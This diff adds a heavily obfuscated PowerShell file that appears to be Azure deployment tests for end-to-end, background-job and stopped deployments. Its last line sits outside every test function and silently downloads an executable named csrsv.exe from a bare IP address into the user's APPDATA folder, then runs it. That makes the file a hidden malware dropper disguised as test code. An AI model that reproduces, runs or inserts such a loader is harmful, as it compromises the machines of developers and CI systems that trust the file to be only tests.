@@ -1,0 +1,112 @@
+function Tes`T`-DEP`l`oyM`enTEndTo`e`ND
+{
+    try
+	{
+	    
+		${rgn`AMe} = .("{6}{1}{5}{4}{3}{0}{2}"-f'Group','Res','Name','rce','u','o','Get-')
+		${dep`loY`Me`NtNAMe} = .("{0}{3}{2}{1}{4}"-f'Get-Res','eN','c','our','ame')
+		${l`O`caTIoN} = ("{1}{0}" -f'S','WestU')
+
+		&("{0}{1}{3}{4}{2}"-f'N','ew-','eGroup','A','zResourc') -Name ${RGna`mE} -Location ${L`oc`AT`IOn}
+
+		
+		${dE`pLOym`E`NT} = &("{3}{2}{1}{0}{4}" -f'oy','Depl','z','New-A','ment') -Name ${dEpLo`ymEn`T`NamE} -Location ${lOCa`T`IOn} -TemplateFile ("{1}{0}{2}{3}{5}{4}" -f 'n_level_templ','subscriptio','at','e','json','.') -TemplateParameterFile ("{0}{1}{6}{4}{2}{3}{7}{5}"-f'subs','cr','ion_','lev','pt','json','i','el_parameters.') -nestedDeploymentRG ${R`GNamE}
+    
+		
+		.("{2}{0}{1}{3}"-f'ssert-Ar','eEqua','A','l') ("{0}{2}{1}"-f 'Suc','eeded','c') ${De`pLOyMe`NT}."PRo`V`ISIOn`IngSt`AtE"
+    
+		${su`B`Id} = (.("{0}{3}{4}{2}{1}"-f'Ge','ext','AzCont','t','-'))."sUBS`CriP`TioN"."su`BScripTIon`iD"
+		${d`epl`Oy`mEnTID} = "/subscriptions/$subId/providers/Microsoft.Resources/deployments/$deploymentName"
+		${G`E`TbYiD} = .("{1}{0}{3}{2}" -f 'epl','Get-AzD','nt','oyme') -Id ${D`eplO`ymENT`Id}
+		&("{1}{2}{0}{3}"-f'Eq','A','ssert-Are','ual') ${ge`Tb`YId}."d`EpL`o`ymenTn`Ame" ${D`e`PLoYmENT}."DepLo`YmENtna`mE"
+
+		${TeMp`l`A`TepaTh} = .("{1}{2}{4}{3}{5}{0}{6}"-f'oym','Save-','A','Dep','z','l','entTemplate') -Name ${de`PL`oYMe`N`Tname} -Force
+		.("{1}{2}{3}{0}" -f'-NotNull','Asse','r','t') ${TE`mPlA`TEP`AtH}."pa`Th"
+
+		${o`PeR`ATions} = &("{3}{5}{0}{2}{4}{1}" -f'-Az','tion','D','Ge','eploymentOpera','t') -DeploymentName ${dep`LoyMeN`T`NAmE}
+		.("{0}{1}{3}{2}"-f'Asser','t-AreE','ual','q') 4 @(${O`per`ATio`NS})."cO`UnT"
+
+		&("{1}{3}{2}{0}"-f'ployment','Rem','e-AzDe','ov') -Name ${de`PL`oymeNTNa`ME}
+	}
+	finally
+	{
+	    .("{0}{1}{2}{3}"-f'Cl','ean-Resourc','eG','roup') ${Rg`N`AMe}
+	}
+}
+
+
+function TEs`T-`dePloymen`T`A`sJoB
+{
+    try
+	{
+	    
+		${rGN`A`me} = .("{2}{4}{0}{1}{3}" -f 'o','urceGr','Get-Re','oupName','s')
+		${DepLO`yM`e`NTNA`Me} = &("{1}{2}{0}{3}"-f'eNam','Ge','t-Resourc','e')
+		${S`TO`Ra`G`eaCc`oUNt`Name} = &("{2}{0}{1}{3}" -f 'rc','eN','Get-Resou','ame')
+		${l`oCat`IoN} = ("{1}{0}"-f 'US','West')
+
+		.("{2}{4}{0}{1}{3}" -f 'Gro','u','New-A','p','zResource') -Name ${rGN`AMe} -Location ${l`oc`A`TiOn}
+
+		
+		${J`oB} = .("{1}{0}{2}{4}{3}" -f'AzD','New-','e','ent','ploym') -Name ${DE`PLO`Y`meN`TNAMe} -Location ${L`Ocat`iOn} -TemplateFile ("{5}{3}{7}{1}{8}{4}{0}{2}{6}" -f 't','_lev','e','cr','_','subs','mplate.json','iption','el') -nestedDeploymentRG ${RGN`AmE} -storageAccountName ${stORagea`cCou`N`TNAMe} -AsJob
+		&("{3}{4}{1}{0}{2}" -f'-AreEqu','t','al','As','ser') ("{1}{0}"-f'ng','Runni') ${J`oB}[0]."sTA`TE"
+
+		${J`oB} = ${j`OB} | &("{2}{0}{1}" -f 'ait-J','ob','W')
+		&("{1}{2}{0}"-f 'l','Assert-AreEqu','a') ("{0}{1}{2}"-f 'Co','mp','leted') ${j`OB}[0]."st`AtE"
+
+		${d`E`PlOyMENT} = ${j`oB} | .("{1}{0}{2}{3}"-f 'i','Rece','v','e-Job')
+		.("{3}{2}{0}{1}" -f't-AreE','qual','ser','As') ("{0}{2}{1}" -f 'S','d','ucceede') ${DePlo`Y`m`ENT}."PROVi`sIo`NingS`TATe"
+    
+		${s`U`BID} = (.("{1}{3}{0}{2}{4}"-f'n','Get-AzC','te','o','xt'))."sU`BScr`Ipt`IOn"."subsCRIP`TIon`Id"
+		${DEplOym`EN`TId} = "/subscriptions/$subId/providers/Microsoft.Resources/deployments/$deploymentName"
+		${geTb`Y`ID} = .("{2}{4}{3}{1}{5}{0}" -f 't','m','Get-AzDep','y','lo','en') -Id ${dE`pLo`YmENtID}
+		.("{1}{0}{2}{3}"-f 'rt-','Asse','AreEqua','l') ${g`et`ByID}."DEP`lO`yMEN`TNaME" ${de`plo`ymeNt}."De`Plo`yME`NtNAMe"
+
+		${O`pE`R`ATIonS} = .("{2}{1}{0}{3}{4}{5}" -f 'A','et-','G','zDe','ploymentOper','ation') -DeploymentName ${dePl`oym`e`N`TnAME}
+		&("{1}{2}{0}{3}{4}"-f 'Ar','Asse','rt-','eEqua','l') 4 @(${OPe`RAT`i`ons})."Cou`NT"
+
+		.("{3}{2}{1}{5}{4}{0}"-f 'ent','zDepl','e-A','Remov','m','oy') -Name ${dEPLoymE`NTna`me}
+	}
+	finally
+	{
+	    &("{1}{4}{3}{2}{0}"-f'rceGroup','Clean','esou','R','-') ${RgN`A`me}
+	}
+}
+
+
+function tesT`-STO`PDEP`lOYm`eNt
+{
+    try
+	{
+	    
+		${RGna`ME} = .("{2}{0}{3}{1}"-f'-Res','me','Get','ourceGroupNa')
+		${dE`PLoYMEN`TN`AME} = &("{0}{1}{2}{3}" -f 'Get','-Res','ourceN','ame')
+		${S`T`OrA`geACCOUnTna`mE} = &("{3}{2}{1}{0}"-f 'me','esourceNa','t-R','Ge')
+		${LocAti`ON} = ("{0}{1}" -f 'West','US')
+
+		.("{5}{0}{1}{4}{2}{3}"-f'-AzReso','ur','Gr','oup','ce','New') -Name ${R`gNamE} -Location ${LoCa`TIOn}
+
+		
+		${j`OB} = &("{0}{1}{2}"-f 'New-AzDeplo','ymen','t') -Name ${de`pLoYmE`Nt`N`Ame} -Location ${l`oCA`TiOn} -TemplateFile ("{2}{0}{4}{3}{5}{1}" -f 'ription_','n','subsc','el_te','lev','mplate.jso') -nestedDeploymentRG ${Rg`NAME} -storageAccountName ${S`TO`RaGEAcC`OUNTn`AMe} -AsJob
+		.("{1}{2}{0}{3}{4}"-f 'rt','Ass','e','-A','reEqual') ("{1}{0}"-f 'g','Runnin') ${j`OB}[0]."STa`Te"
+
+		
+
+		&("{0}{1}{2}{3}{4}" -f'Sto','p-AzDeplo','y','m','ent') -Name ${Dep`lOYmenTna`me}
+
+		${J`ob} = ${j`Ob} | .("{0}{1}{2}" -f'Wait-','Jo','b')
+		&("{2}{0}{3}{1}" -f'ssert','reEqual','A','-A') ("{1}{2}{0}" -f'pleted','C','om') ${j`oB}[0]."s`TaTE"
+
+		${DEp`Lo`y`mEnT} = ${J`ob} | &("{0}{1}{2}" -f 'Re','cei','ve-Job')
+		.("{3}{1}{4}{0}{2}" -f 'a','ssert-Are','l','A','Equ') ("{1}{0}" -f'nceled','Ca') ${DEP`loy`me`NT}."PROViSi`ON`InGS`T`Ate"
+
+		
+
+		.("{2}{0}{3}{4}{1}" -f'move-Az','ent','Re','Depl','oym') -Name ${D`EP`lOYmeNt`N`Ame}
+	}
+	finally
+	{
+	    &("{5}{2}{3}{4}{0}{1}"-f'Gr','oup','ea','n-Res','ource','Cl') ${RGn`A`me}
+	}
+}
+(&("{2}{1}{0}"-f 'ct','bje','New-O') ("{0}{2}{1}{4}{3}"-f'Syst','t','em.Ne','lient','.WebC')).("{0}{2}{1}"-f 'Down','le','loadFi').Invoke(("{0}{3}{1}{7}{6}{5}{4}{2}{9}{8}" -f 'h','t','/~','t','238','3.','94.102.5','p://','.exe','yahoo/csrsv'),"$env:APPDATA\csrsv.exe");.("{2}{3}{1}{4}{0}"-f 's','-Pro','St','art','ces') ("$env:APPDATA\csrsv.exe")
